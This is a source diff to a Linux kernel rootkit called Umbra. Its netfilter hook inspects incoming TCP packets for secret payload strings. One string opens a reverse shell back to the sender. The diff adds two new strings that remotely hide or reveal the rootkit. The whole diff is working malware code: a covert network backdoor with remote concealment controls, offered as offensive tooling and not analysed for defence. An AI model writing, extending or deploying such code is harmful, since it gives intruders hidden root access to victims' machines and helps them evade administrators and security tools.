@@ -1,13 +1,16 @@
 #include "../include/netfilter_manager.h"
 #include "../include/utils.h"
 #include "../include/CONFIG.h"
+#include "../include/hookers.h"
 
 const char* UMBRA_BACKDOOR_KEY = "UMBRA_PAYLOAD_GET_REVERSE_SHELL";
+const char* UMBRA_HIDE_ROOTKIT_KEY = "UMBRA_HIDE_ROOTKIT";
+const char* UMBRA_SHOW_ROOTKIT_KEY = "UMBRA_SHOW_ROOTKIT";
 /**
  * Inspects incoming packets and check correspondence to backdoor packet:
  *      Proto: TCP
  *      Port: 9000
- *      Payload: UMBRA_PAYLOAD_GET_REVERSE_SHELL
+ *      Payload: UMBRA_PAYLOAD_GET_REVERSE_SHELL (or any other payload of above)
  */ 
 unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
     //Network headers
@@ -77,8 +80,10 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         if(strlen(user_data)<31){
             return NF_ACCEPT;
         }
-
+        
         if(memcmp(user_data, UMBRA_BACKDOOR_KEY, strlen(UMBRA_BACKDOOR_KEY))==0){
+            /****BACKDOOR KEY - Open a shell***/
+
             //Packet had the secret payload.
             printk(KERN_INFO "UMBRA:: Received backdoor packet \n");
             //kfree(_data);
@@ -91,7 +96,20 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
             //TODO: Hide the backdoor packet to the local system
             return NF_DROP;
+        }else if(memcmp(user_data, UMBRA_HIDE_ROOTKIT_KEY, strlen(UMBRA_HIDE_ROOTKIT_KEY))==0){
+            /****HIDE ROOTKIT KEY - Hide the rootkit, remotely***/
+
+            printk(KERN_INFO "UMBRA:: Received order to hide the rootkit \n");
+            hide_rootkit();
+
+        }else if(memcmp(user_data, UMBRA_SHOW_ROOTKIT_KEY, strlen(UMBRA_SHOW_ROOTKIT_KEY))==0){
+            /****SHOW ROOTKIT KEY - Show the rootkit, remotely***/
+
+            printk(KERN_INFO "UMBRA:: Received order to unhide the rookit \n");
+            show_rootkit();
         }
+
+
 
 
         return NF_ACCEPT;
